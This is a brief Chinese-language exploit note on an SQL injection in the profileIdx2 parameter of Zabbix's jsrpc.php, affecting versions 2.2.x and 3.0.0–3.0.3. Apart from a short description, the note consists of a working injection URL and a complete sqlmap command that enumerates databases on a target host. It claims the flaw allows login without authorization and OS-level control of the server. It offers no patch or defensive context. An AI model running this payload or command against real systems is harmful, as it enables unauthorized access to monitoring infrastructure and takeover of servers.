### 漏洞信息
1.影响版本：
   Zabbix v2.2.x, 3.0.0-3.0.3
2.详情： 
   zabbix的jsrpc的profileIdx2参数存在insert方式的SQL注入漏洞，攻击者无需授权登陆即可登陆zabbix管理系统，也可通过script等功能轻易直接获取zabbix服务器的操作系统权限
3.Payload：
  /jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=2'3297&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=& mark_color=1

  使用SQLMAP:
      python sqlmap.py -u "http://172.16.244.134/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=2'3297&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=& mark_color=1" -p "profileIdx2" --technique E --dbs
  